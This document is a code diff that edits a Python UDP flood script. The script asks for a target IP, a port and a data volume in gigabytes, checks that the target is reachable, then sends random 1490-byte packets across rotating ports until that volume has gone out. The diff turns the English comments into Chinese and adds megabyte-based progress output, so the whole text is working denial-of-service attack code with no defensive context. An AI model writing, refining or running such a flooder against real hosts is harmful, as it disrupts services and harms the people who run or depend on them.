@@ -2,7 +2,6 @@ import sys
 import os
 import time
 import socket
-import random
 from datetime import datetime
 
 now = datetime.now()
@@ -15,7 +14,7 @@ year = now.year
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 PACKET_SIZE = 1490
-data = os.urandom(PACKET_SIZE)   # 修正为 os.urandom
+data = os.urandom(PACKET_SIZE)   # 随机载荷
 #############
 
 os.system("clear")
@@ -48,15 +47,15 @@ print("")
 ip = input("IP Target : ")
 port = int(input("Port       : "))
 
-# ---------- 改为输入总流量（GB）----------
+# ---------- 输入总流量（GB）----------
 gb = float(input("Total data to send (GB) : "))
 total_bytes = gb * 1024 * 1024 * 1024
 max_packets = int(total_bytes // PACKET_SIZE)   # 根据包大小计算总包数
 print(f"[*] Will send {max_packets} packets ({gb} GB).")
 
-# ---------- Target reachability check ----------
+# ---------- 目标可达性检查 ----------
 def check_target(ip, port):
-    """Try a TCP connection, return True if successful, else False."""
+    """尝试 TCP 连接，成功返回 True，否则返回 False"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(3)
@@ -73,14 +72,24 @@ if not check_target(ip, port):
 # ----------------------------------------------
 
 sent = 0
+sent_bytes = 0
+next_mb_threshold = 1024 * 1024   # 1 MB
+
 while sent < max_packets:
     try:
         sock.sendto(data, (ip, port))
         sent += 1
+        sent_bytes += PACKET_SIZE
         port += 1
-        print(f"Sent {sent} packet to {ip} through port:{port}")
         if port == 65534:
             port = 1
+
+        # 每当累计发送量达到下一个 MB 时输出一次
+        if sent_bytes >= next_mb_threshold:
+            mb_sent = sent_bytes / (1024 * 1024)
+            print(f"Sent {sent} packets, total {mb_sent:.2f} MB")
+            next_mb_threshold += 1024 * 1024
+
     except KeyboardInterrupt:
         print("\n[!] Stopped by user")
         sys.exit()
@@ -88,4 +97,4 @@ while sent < max_packets:
         print(f"\n[!] Error: {e}")
         sys.exit()
 
-print(f"\n[+] Finished. Total packets sent: {sent}")
+print(f"\n[+] Finished. Total packets sent: {sent}, total data: {sent_bytes / (1024 * 1024):.2f} MB")
